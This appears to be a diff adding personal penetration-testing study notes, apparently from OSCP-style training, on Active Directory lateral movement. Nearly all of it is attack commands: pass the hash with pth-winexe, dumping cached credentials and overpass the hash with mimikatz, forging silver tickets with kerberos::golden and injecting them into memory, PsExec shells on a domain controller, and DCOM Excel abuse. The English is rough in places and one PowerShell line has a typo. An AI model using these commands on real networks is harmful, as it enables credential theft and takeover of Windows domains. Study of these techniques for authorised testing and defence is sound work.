@@ -1,0 +1,95 @@
+
+there is not much cases that using cleartext based password hash
+
+=============
+pass the hash
+=============
+authenticate using NTLM hash
+it grants us local administrative privilege
+target : server or service that using NTLM hash, not kerberos
+
+pth-winexe -U <NTLM hash> //<target ip> <shell>
+ex. pth-winexe -U offsec%fjdioasfjdioas~~ //10.11.0.22 cmd
+
+=================
+overpass the hash
+=================
+abuse a NTLM user hash to gain a full kerberos TGT or service ticket
+it grants us access to another machine or service as that user
+
+1. save administrative user's credential into the cache : run a process with admin user
+	open a notepad.exe
+	right click the notepad icon on the taskbar
+	shift+right click the notepad icon inside of the popup
+	click 'run as different user'
+
+2. dump the cached credential
+	mimikatz.exe
+		# sekurlsa::logonpasswords
+3. turn the NTLM hash into a kerberos ticket
+	it avoid the use of NTLM authentication
+	mimikatz.exe
+		# sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM hash> /run:<shell>
+		ex. # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:f2f908d2~~~ /run:PowerShell.exe
+	check the ticket
+		PS> klist
+		there is no cached tickets yet
+4. authenticate to a network share on the DC
+	it generate TGT
+		PS> net use \\<DC>
+	check the ticket
+		PS> klist
+
+5. reuse TGT to launch a command shell on the DC
+	PsExec.exe
+		runs a command remotely but doesn't accept password hashes
+		.\PsExec.exe \\<machine> <shell>
+		ex. .\PsExec.exe \\dc01 cmd.exe
+	
+
+===============
+pass the ticket
+===============
+it's not required to get administrative privileges
+it don't provide us with any additional access, we can choose which machine to use the ticket from
+application server doesn't know the password hash. so blindly trust the integrity of the service ticket
+
+conditions
+	the service ticket belong to the current user
+	the service is registered with a SPN
+
+custom-created ticket(silver ticket)
+	forge our own service ticket to application server
+		using service account password or it's associated NTLM hash
+	can use this against all has same SPN
+
+1. obtain the security identifier(SID)
+	> whoami /user
+	SID : except of the last 4-digit part(that is RID)
+	
+2. create silver ticket
+	mimikatz.exe
+	flush any existing kerberos tickets
+		# kerberos::purge
+	verify the purge
+		# kerberos::list
+	create silver ticket
+		# kerberos::golden /user:<username> /domain:<domain> /sid:<sid> /target:<hostname> /service:<service type> /rc4:<password hash> /ptt
+		/ptt : inject silver ticket directly into the memory
+		ex. kerberos::golden /user:offsec /domain:corp.com /sid:S-1-~~~ /target:CorpWebServer.corp.com /service:HTTP /rc4:E24fds9f2~~~ /ptt
+
+3. use the silver ticket
+	can interact with the service and access any information based on the group memberships on silver ticket
+
+==================================
+distributed component object model
+==================================
+component object model(COM)
+	a system for creating software components that interact with each other
+	
+leverage the DCOM object
+	ex. excel
+	PS> $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application". "<target ip>"))
+	PS> $com | Get-Member
+	make macro excel file and send to the victim
+		exceldcom.ps1
